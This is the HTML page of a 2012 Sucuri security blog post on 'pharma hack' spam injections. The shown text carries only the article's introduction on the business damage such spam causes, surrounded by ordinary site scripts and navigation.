<!DOCTYPE html>
<html lang="en-US">
<head >
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Intelligent (Pharma) Spam Decoded</title>
<meta name='robots' content='max-image-preview:large' />

<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://mashshare.net -->
<meta property="og:type" content="article" /> 
<meta property="og:title" content="Intelligent (Pharma) Spam Decoded" />
<meta property="og:description" content="We are seeing a rise in the use of intelligent SPAM - a.k.a Pharma Hack - across a number of platforms. We recently found a nice injection that made us salivate, we figured you'd be just" />
<meta property="og:url" content="https://blog.sucuri.net/2012/03/intelligent-pharma-spam-decoded.html" />
<meta property="og:site_name" content="Sucuri Blog" />
<meta property="article:publisher" content="https://www.facebook.com/SucuriSecurity/" />
<meta property="article:published_time" content="2012-03-22T12:33:49-07:00" />
<meta property="article:modified_time" content="2012-03-22T12:33:49-07:00" />
<meta property="og:updated_time" content="2012-03-22T12:33:49-07:00" />
<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://www.mashshare.net -->
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Intelligent (Pharma) Spam Decoded">
<meta name="twitter:description" content="We are seeing a rise in the use of intelligent SPAM - a.k.a Pharma Hack - across a number of platforms. We recently found a nice injection that made us salivate, we figured you'd be just">
<meta name="twitter:site" content="@sucurisecurity">
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->


<!-- This site is optimized with the Yoast SEO Premium plugin v12.5 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://blog.sucuri.net/2012/03/intelligent-pharma-spam-decoded.html" />
<!-- / Yoast SEO Premium plugin. -->

<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Feed" href="https://blog.sucuri.net/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Comments Feed" href="https://blog.sucuri.net/comments/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Intelligent (Pharma) Spam Decoded Comments Feed" href="https://blog.sucuri.net/2012/03/intelligent-pharma-spam-decoded.html/feed" />
<!-- This site uses the Google Analytics by MonsterInsights plugin v7.10.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
<script type="text/javascript" data-cfasync="false">
	var mi_version         = '7.10.0';
	var mi_track_user      = true;
	var mi_no_track_reason = '';
	
	var disableStr = 'ga-disable-UA-4077922-18';

	/* Function to detect opted out users */
	function __gaTrackerIsOptedOut() {
		return document.cookie.indexOf(disableStr + '=true') > -1;
	}

	/* Disable tracking if the opt-out cookie exists. */
	if ( __gaTrackerIsOptedOut() ) {
		window[disableStr] = true;
	}

	/* Opt-out function */
	function __gaTrackerOptout() {
	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
	  window[disableStr] = true;
	}
	
	if ( mi_track_user ) {
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');

		__gaTracker('create', 'UA-4077922-18', 'auto');
		__gaTracker('set', 'forceSSL', true);
		__gaTracker('require', 'displayfeatures');
		__gaTracker('send','pageview');
	} else {
		console.log( "" );
		(function() {
			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
			var noopfn = function() {
				return null;
			};
			var noopnullfn = function() {
				return null;
			};
			var Tracker = function() {
				return null;
			};
			var p = Tracker.prototype;
			p.get = noopfn;
			p.set = noopfn;
			p.send = noopfn;
			var __gaTracker = function() {
				var len = arguments.length;
				if ( len === 0 ) {
					return;
				}
				var f = arguments[len-1];
				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason );
					return;
				}
				try {
					f.hitCallback();
				} catch (ex) {

				}
			};
			__gaTracker.create = function() {
				return new Tracker();
			};
			__gaTracker.getByName = noopnullfn;
			__gaTracker.getAll = function() {
				return [];
			};
			__gaTracker.remove = noopfn;
			window['__gaTracker'] = __gaTracker;
					})();
		}
</script>
<!-- / Google Analytics by MonsterInsights -->
<link rel='stylesheet' id='sucuri-blog-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/style.css?ver=1.2.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://blog.sucuri.net/wp-includes/css/dist/block-library/style.min.css?ver=6.0.1' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel='stylesheet' id='select2-css'  href='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='mashsb-styles-css'  href='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/css/mashsb.min.css?ver=3.8.1' type='text/css' media='all' />
<style id='mashsb-styles-inline-css' type='text/css'>
.mashsb-count {color:#cccccc;}[class^="mashicon-"] .text, [class*=" mashicon-"] .text{
    text-indent: -9999px !important;
    line-height: 0px;
    display: block;
    } 
    [class^="mashicon-"] .text:after, [class*=" mashicon-"] .text:after {
        content: "" !important;
        text-indent: 0;
        font-size:13px;
        display: block !important;
    }
    [class^="mashicon-"], [class*=" mashicon-"] {
        width:25%;
        text-align: center !important;
    }
    [class^="mashicon-"] .icon:before, [class*=" mashicon-"] .icon:before {
        float:none;
        margin-right: 0;
    }
    .mashsb-buttons a{
       margin-right: 3px;
       margin-bottom:3px;
       min-width: 0;
       width: 41px;
    }
    .onoffswitch, 
    .onoffswitch-inner:before, 
    .onoffswitch-inner:after 
    .onoffswitch2,
    .onoffswitch2-inner:before, 
    .onoffswitch2-inner:after  {
        margin-right: 0px;
        width: 41px;
        line-height: 41px;
    }#mashbar-header .mashsb-count { 
    display:none; 
}
</style>
<link rel='stylesheet' id='sucuriblog-google-fonts-css'  href='//fonts.googleapis.com/css?family=Open+Sans:300,400,400italic,700,600' type='text/css' media='all' />
<link rel='stylesheet' id='cookie-banner-css-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/css/cookie-banner.css?ver=20200427' type='text/css' media='all' />
<script type='text/javascript' id='monsterinsights-frontend-script-js-extra'>
/* <![CDATA[ */
var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/blog.sucuri.net","hash_tracking":"false"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/google-analytics-premium/assets/js/frontend.min.js?ver=7.10.0' id='monsterinsights-frontend-script-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.js?ver=4.0.1' id='select2-js'></script>
<script type='text/javascript' id='mashsb-js-extra'>
/* <![CDATA[ */
var mashsb = {"shares":"0","round_shares":"1","animate_shares":"1","dynamic_buttons":"0","share_url":"https:\/\/blog.sucuri.net\/2012\/03\/intelligent-pharma-spam-decoded.html","title":"Intelligent+%28Pharma%29+Spam+Decoded","image":null,"desc":"We are seeing a rise in the use of intelligent SPAM - a.k.a Pharma Hack - across a number of platforms. We recently found a nice injection that made us\u00a0salivate, we figured you'd be just \u2026","hashtag":"@sucurisecurity","subscribe":"link","subscribe_url":"http:\/\/sucuri.hs-sites.com\/subscribe-to-security","activestatus":"1","singular":"1","twitter_popup":"1","refresh":"1","nonce":"c1b7e23fe8","postid":"3552","servertime":"1659523335","ajaxurl":"https:\/\/blog.sucuri.net\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/js/mashsb.min.js?ver=3.8.1' id='mashsb-js'></script>
<!--[if lt IE 9]>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/html5shiv.min.js?ver=3.7.3' id='html5shiv-js'></script>
<![endif]-->
<link rel="https://api.w.org/" href="https://blog.sucuri.net/wp-json/" /><link rel="alternate" type="application/json" href="https://blog.sucuri.net/wp-json/wp/v2/posts/3552" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.sucuri.net/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.sucuri.net/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='https://blog.sucuri.net/?p=3552' />


<!-- This site is optimized with the Schema plugin v1.7.9.4 - https://schema.press -->
<script type="application/ld+json">{"@context":"https:\/\/schema.org\/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sucuri.net\/2012\/03\/intelligent-pharma-spam-decoded.html"},"url":"https:\/\/blog.sucuri.net\/2012\/03\/intelligent-pharma-spam-decoded.html","headline":"Intelligent (Pharma) Spam Decoded","datePublished":"2012-03-22T12:33:49-07:00","dateModified":"2012-03-22T12:33:49-07:00","publisher":{"@type":"Organization","@id":"https:\/\/blog.sucuri.net\/#organization","name":"Sucuri Blog","logo":{"@type":"ImageObject","url":"","width":600,"height":60}},"articleSection":"Website Malware Infections","keywords":"Hacked Websites, Malware Updates, SEO Spam","description":"We are seeing a rise in the use of intelligent SPAM - a.k.a Pharma Hack - across a number of platforms. We recently found a nice injection that made us salivate, we figured you'd be just as interested It is of no surprise to us that attackers are always looking","author":{"@type":"Person","name":"Rodrigo Escobar","url":"https:\/\/blog.sucuri.net\/author\/rodrigo","description":"Rodrigo Escobar is Sucuri's Sr. Malware Research Manager who joined the company in 2012. Rodrigo's main responsibilities include the coordination of malware analysts and research groups, and deployment of effective remediation solutions. His professional experience covers more than eight years in website remediation and malware analysis. When Rodrigo isn't investigating cyber threats and looking for solutions to prevent them, you might find him at the computer, reading assembly and learning new skills. Connect with him on LinkedIn.","image":{"@type":"ImageObject","url":"https:\/\/secure.gravatar.com\/avatar\/8cf56aa2ff693db59b0e186bf1b34f5a?s=96&d=mm&r=g","height":96,"width":96}}}</script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-4077922-18', 'auto');
  ga('require', 'linker');
  ga('linker:autoLink', ['ddecode.com', 'unmaskparasites.com', 'urlfind.org']);
  ga('send', 'pageview');
</script>

<script type="text/javascript">
(function(a,b,c,d,e,f,g){e['ire_o']=c;e[c]=e[c]||function(){(e[c].a=e[c].a||[]).push(arguments)};f=d.createElement(b);g=d.getElementsByTagName(b)[0];f.async=1;f.src=a;g.parentNode.insertBefore(f,g);})('//d.impactradius-event.com/A166802-5dda-4f98-aad8-1f58dbc8f1771.js','script','ire',document,window);
</script>
<script type='text/javascript'>/*<![CDATA[*/(function(n,d,c){d.setTime(d.getTime()+2592000000);c=(new RegExp('[?&]'+n+'=([^&#]*)','i')).exec(window.location.search);if(c=c?c[1]:null)document.cookie=n+'='+c+';expires='+d.toUTCString()+';domain=.sucuri.net;path=/';})('cjevent',new Date());/*]]>*/</script><!-- Tealium Universal Tag --><script type="text/javascript">(function(a,b,c,d){a='//tags.tiqcdn.com/utag/gpl/sucuri/prod/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a)})();</script><link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-32x32.png" sizes="32x32" />
<link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-180x180.png" />
<meta name="msapplication-TileImage" content="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-270x270.png" />
		<style type="text/css" id="wp-custom-css">
			#menu-item-17506{ background-color: #619f42;}
#menu-item-17506:hover {background-color:#478237}
#menu-item-17506 > a { color:#fff;}
.nav-primary {
 width: 80%;
}

.genesis-nav-menu {
 display:table;
}

.genesis-nav-menu .menu-item {
 float:none;
 display:table-cell;
 text-align:center;
 vertical-align:top;
}

.text-right {
 text-align:right !important;
}

.genesis-nav-menu .languages-sub-menu a {
 margin-right:0;
}

/* Blog Background Green Color Replace*/
#menu-item-17506 { background-color: #008673!important; }
.home.archive-post-grid .archive-featured-post:first-of-type { border-top: 8px solid #008673!important; }
.button { background-color: #008673!important; }
#sidebar-cta .widget { background-color: #008673!important; }
.fwp-load-more:focus, .fwp-load-more:hover, .load-more:focus, .load-more:hover {
    background-color: #008673!important;
}
.social-icons a::before {
    background-color: #008673!important;
}
.footer-widgets .social-icons a:focus::before, .footer-widgets .social-icons a:hover::before, .footer-widgets .button:focus, .footer-widgets .button:hover {
    background-color: #008673!important;
}	
.button { background-color: #008673!important; }

.footer-widgets .button:hover { background-color: #26BA9E!important; }		</style>
		</head>
<body class="post-template-default single single-post postid-3552 single-format-standard header-full-width content-sidebar"><div class="site-container"><ul class="genesis-skip-link"><li><a href="#genesis-nav-primary" class="screen-reader-shortcut"> Skip to primary navigation</a></li><li><a href="#genesis-content" class="screen-reader-shortcut"> Skip to content</a></li><li><a href="#genesis-sidebar-primary" class="screen-reader-shortcut"> Skip to primary sidebar</a></li><li><a href="#genesis-footer-widgets" class="screen-reader-shortcut"> Skip to footer</a></li></ul><header class="site-header" itemscope itemtype="https://schema.org/WPHeader"><div class="wrap"><div class="title-area"><p class="site-title" itemprop="headline"><a href="https://blog.sucuri.net/">Sucuri Blog</a></p><p class="site-description screen-reader-text" itemprop="description">Website Security News</p></div><nav class="nav-primary" aria-label="Main" itemscope itemtype="https://schema.org/SiteNavigationElement" id="genesis-nav-primary"><ul id="menu-header-navigation-ii" class="menu genesis-nav-menu menu-primary js-superfish"><li id="menu-item-17495" class="menu-item-products menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17495"><a href="https://sucuri.net/website-antivirus/signup" itemprop="url"><span itemprop="name">Products</span></a>
<ul class="sub-menu">
	<li id="menu-item-17496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17496"><a href="https://sucuri.net/website-security-platform/signup/" itemprop="url"><span itemprop="name">Website Security Platform</span></a></li>
	<li id="menu-item-17497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17497"><a href="https://sucuri.net/website-firewall/" itemprop="url"><span itemprop="name">Website Firewall (WAF)</span></a></li>
	<li id="menu-item-20814" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20814"><a href="https://sucuri.net/custom/enterprise/" itemprop="url"><span itemprop="name">Enterprise Website Security</span></a></li>
	<li id="menu-item-20815" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20815"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Multisite Solutions</span></a></li>
</ul>
</li>
<li id="menu-item-17498" class="menu-item-industry menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17498"><a href="https://sucuri.net/website-security-platform/" itemprop="url"><span itemprop="name">Features</span></a>
<ul class="sub-menu">
	<li id="menu-item-17499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17499"><a href="https://sucuri.net/malware-detection-scanning/" itemprop="url"><span itemprop="name">Detection</span></a></li>
	<li id="menu-item-17500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17500"><a href="https://sucuri.net/website-hack-protection/" itemprop="url"><span itemprop="name">Protection</span></a></li>
	<li id="menu-item-17501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17501"><a href="https://sucuri.net/website-performance/" itemprop="url"><span itemprop="name">Performance</span></a></li>
	<li id="menu-item-19564" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19564"><a href="https://sucuri.net/website-malware-removal/" itemprop="url"><span itemprop="name">Response</span></a></li>
	<li id="menu-item-19911" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19911"><a href="https://sucuri.net/website-backups/" itemprop="url"><span itemprop="name">Backups</span></a></li>
</ul>
</li>
<li id="menu-item-19912" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-19912"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a>
<ul class="sub-menu">
	<li id="menu-item-19913" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19913"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Agency Solutions</span></a></li>
	<li id="menu-item-19915" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19915"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a></li>
	<li id="menu-item-20816" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20816"><a href="https://sucuri.net/referral/" itemprop="url"><span itemprop="name">Referral Program</span></a></li>
	<li id="menu-item-19914" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19914"><a href="https://sucuri.net/ecommerce-website-security/" itemprop="url"><span itemprop="name">Ecommerce</span></a></li>
</ul>
</li>
<li id="menu-item-20817" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-20817"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Resources</span></a>
<ul class="sub-menu">
	<li id="menu-item-20818" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20818"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Guides</span></a></li>
	<li id="menu-item-20819" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20819"><a href="https://sucuri.net/webinars/" itemprop="url"><span itemprop="name">Webinars</span></a></li>
	<li id="menu-item-20820" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20820"><a href="https://sucuri.net/infographics/" itemprop="url"><span itemprop="name">Infographics</span></a></li>
	<li id="menu-item-20821" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20821"><a href="https://sitecheck.sucuri.net/" itemprop="url"><span itemprop="name">SiteCheck</span></a></li>
	<li id="menu-item-20822" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20822"><a href="https://sucuri.net/reports/" itemprop="url"><span itemprop="name">Reports</span></a></li>
	<li id="menu-item-22570" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22570"><a href="https://sucuri.net/email-courses/" itemprop="url"><span itemprop="name">Email Courses</span></a></li>
</ul>
</li>
<li id="menu-item-17506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17506"><a href="https://sucuri.net/website-security-platform/help-now" itemprop="url"><span itemprop="name">Immediate Help</span></a></li>
<li id="menu-item-17509" class="menu-item-login menu-item menu-item-type-custom menu-item-object-custom menu-item-17509"><a href="https://dashboard.sucuri.net/login/" itemprop="url"><span itemprop="name">Login</span></a></li>
</ul></nav><button id="responsive-menu" role="button" aria-controls="genesis-nav-primary" aria-pressed="false"><span class="screen-reader-text">Menu</span></button></div></header><div class="site-inner"><div class="wrap"><div class="content-sidebar-wrap"><main class="content" id="genesis-content"><article class="post-3552 post type-post status-publish format-standard category-website-malware-infections tag-hacked-websites tag-malware-updates tag-seo-spam entry"><header class="entry-header"><h1 class="entry-title">Intelligent (Pharma) Spam Decoded</h1>
<p class="entry-meta"><time class="entry-time" datetime="2012-03-22T12:33:49-07:00">March 22, 2012</time><span class="entry-author"><a href="https://blog.sucuri.net/author/rodrigo" class="entry-author-link" rel="author"><span class="entry-author-name">Rodrigo Escobar</span></a></span></p></header><div class="entry-content"><aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2012%2F03%2Fintelligent-pharma-spam-decoded.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Intelligent%20%28Pharma%29%20Spam%20Decoded&url=https://blog.sucuri.net/2012/03/intelligent-pharma-spam-decoded.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--><p>We are seeing a rise in the use of intelligent SPAM &#8211; a.k.a Pharma Hack &#8211; across a number of platforms. We recently found a nice injection that made us salivate, we figured you&#8217;d be just as interested</p>
<p>It is of no surprise to us that attackers are always looking for ways to trick us and more importantly our users. This gem of a find was no different.</p>
<h2 style="text-align: center;">SPAM = <em>&#8220;Stupid, Pointless Annoying Message&#8221;</em>.</h2>
<p>SPAM, in the form of unsolicited e-mail messages, is a problem that we face every day.  Imagine sending a client a link to a newly released product, they get to the page, and BAM they&#8217;re greeted with advertisements for pharmaceutical products (Viagra / Cialis / Male Enhancers). What do you think the impact would be?<span id="more-3552"></span></p>
<p>If you&#8217;re wondering, allow us to tell you. It would be devastating. Not only do you run the risk of losing credibility but you also run the risk of becoming blacklisted. Both of these have a similar affect, loss of money and followship. Neither are things most of us that live on the web can afford.</p>
